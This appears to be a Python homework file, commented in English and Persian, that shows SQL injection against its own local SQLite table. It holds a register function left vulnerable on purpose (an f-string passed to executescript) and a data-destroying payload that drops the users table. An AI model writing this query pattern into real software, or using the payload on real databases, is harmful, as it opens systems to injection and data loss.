import sqlite3
import logging

# Database file name
# نام فایل دیتابیس
DB_NAME = 'homework.db'

# --- The Vulnerable Function (Do not change) ---
# --- تابع آسیب‌پذیر (نباید تغییر کند) ---
def register(username: str, password: str) -> None:
    """
    VULNERABLE: Registers a user without using parametrized queries.
    آسیب‌پذیر: کاربری را بدون استفاده از پرس‌وجوهای پارامتری ثبت می‌کند.
    """
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        # The programmer used an f-string (vulnerable) and executescript (allows multiple commands)
        # برنامه‌نویس از f-string (آسیب‌پذیر) و executescript (اجازه دستورات چندگانه) استفاده کرده است
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}') 
            """
        )
        conn.commit()

# --- The Hack Function ---
# --- تابع هک ---
def hack() -> None:
    """
    Provides input strings to exploit the register function.
    رشته‌های ورودی را برای سوءاستفاده از تابع register فراهم می‌کند.
    """
    
    # 1. Injection Payload for username
    # 1. بارگذاری تزریق برای نام کاربری
    # We close the INSERT statement, then perform a malicious action, and finally use '--' 
    # to comment out the rest of the original query (the closing single quote for password).
    # ما دستور INSERT را می‌بندیم، سپس یک اقدام مخرب انجام می‌دهیم، و در نهایت از '--' 
    # برای کامنت کردن بقیه کوئری اصلی (تک کوتیشن پایانی برای رمز عبور) استفاده می‌کنیم.
    
    # The resulting SQL script will be: 
    # INSERT INTO `table_users` (username, password) VALUES ('hacker', ''); DROP TABLE table_users; --')
    # The first INSERT will execute and fail/succeed depending on the table schema, but the second one (DROP TABLE) will execute.
    
    username: str = "hacker" 
    
    # Payload: Close the previous quote, close the INSERT statement, execute malicious code, comment out the rest
    # بارگذاری: بستن کوتیشن قبلی، بستن دستور INSERT، اجرای کد مخرب، کامنت کردن بقیه
    # Note: We must insert the malicious code into the 'password' field to correctly terminate the first INSERT statement.
    # توجه: ما باید کد مخرب را در فیلد 'password' درج کنیم تا دستور INSERT اول به درستی خاتمه یابد.
    
    # The original query is: ... VALUES ('{username}', '{password}')
    
    # If we put the injection in password, the final query is:
    # INSERT INTO `table_users` (username, password) VALUES ('hacker', '') ; DROP TABLE table_users; -- ')
    password: str = "'); DROP TABLE table_users; --"
    
    # Execute the hack
    # اجرای هک
    register(username, password)
    
    logging.warning("!!! HACK EXECUTED !!! Table table_users should now be deleted or modified.")

# --- Main for Demonstration ---
# --- بخش اصلی برای نمایش ---
def main():
    # Setup the vulnerable table first
    # ابتدا جدول آسیب‌پذیر را تنظیم کنید
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute("DROP TABLE IF EXISTS table_users")
        cursor.execute("CREATE TABLE table_users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT)")
        cursor.execute("INSERT INTO table_users VALUES (1, 'admin', 'securepass123')")
        conn.commit()
        
        print("Table 'table_users' created with 1 user.")
        
        # Check initial state
        # بررسی وضعیت اولیه
        cursor.execute("SELECT COUNT(*) FROM table_users")
        print(f"Initial user count: {cursor.fetchone()[0]}")

    # Run the hack
    # اجرای هک
    hack()
    
    # Check final state
    # بررسی وضعیت نهایی
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        try:
            # This query will fail if the table was dropped
            # اگر جدول حذف شده باشد، این کوئری شکست می‌خورد
            cursor.execute("SELECT COUNT(*) FROM table_users")
            print(f"Final user count: {cursor.fetchone()[0]}")
        except sqlite3.OperationalError as e:
            if "no such table" in str(e):
                print("SUCCESS: Table 'table_users' was successfully dropped via SQL Injection.")
            else:
                raise

if __name__ == '__main__':
    main()
